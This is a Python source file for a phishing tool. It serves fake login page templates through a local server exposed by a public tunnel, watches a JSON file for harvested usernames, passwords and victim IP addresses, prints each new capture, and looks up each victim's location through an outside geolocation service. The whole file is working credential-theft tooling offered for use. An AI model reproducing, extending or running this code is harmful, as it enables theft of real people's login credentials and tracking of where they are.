#!/usr/bin/python

import threading, os, json, time
from V7xStyle import Text
import urllib.request, requests
db_File = os.getcwd()+'/tools/Fishing/db.json'

class Fishing:
    def __init__(self,path):
        self.ToolPath = path
        self.template = None

    def start(self,page):
        self.template = page
        def serv(page):
            os.chdir('tools/Fishing')
            server = f'python3 App.py {page} start'
            os.system(server+' 2> /dev/null > request.txt')
            os.chdir(self.ToolPath)
        T = threading.Thread(target=serv, args=[page])
        T.daemon = True
        T.start()
        time.sleep(5)
        self.url()
        print(Text('G#[*] localhost : Y#http://127.0.0.1:5000\n'))

    def listening(self,db_file):
        with open(db_file) as db:
            data = json.load(db)
        def LSIN(data,db_file):
            while True:
                with open(db_file) as dbs:
                    try:
                        dbs = json.load(dbs)
                    except json.decoder.JSONDecodeError:
                        dbs = {'username':False,'password':False}
                if dbs['username'] and data['username']:
                    if dbs['username'] != data['username']:
                        ipu = Text(f"G#[W#*G#] ip R#:Y# {dbs['ip']}  ")
                        tem = Text(f"G#[W#*G#] template R#:P# {self.template}  ")
                        use = Text(f"G#[W#*G#] username R#:C# {dbs['username']}")
                        pas = Text(f"G#[W#*G#] password R#:C# {dbs['password']}")
                        print(f'{ipu}{" "*9}\n{tem}\n{use}\n{pas}')
                        # location...
                        print( self.location(dbs['ip']) )
                        data = dbs
        T = threading.Thread(target=LSIN, args=[data,db_file])
        T.daemon = True
        T.start()

    def location(self,ip):
        ip = str(ip).strip()
        with urllib.request.urlopen(f"https://geolocation-db.com/jsonp/{ip}") as url:
            data = url.read().decode()
            data = json.loads(data.split("(")[1].strip(")"))
        db = str(Text('Y#┌───[ location ]───>          \n'))
        for n,i in data.items():
             db += str(Text(f"Y#│ G#{n} :B# {i}Y#\n"))
        db += '└─────────────────────[ CTRL+C ]>\n'
        return db

    def url(self):
        try:
            url = requests.get('http://localhost:4040/api/tunnels')
            Js = url.json()['tunnels']
            print (Text(f"G#[*] url : Y#{Js[0]['public_url'].replace('http:','https:')}"))
        except requests.exceptions.ConnectionError:
            return False
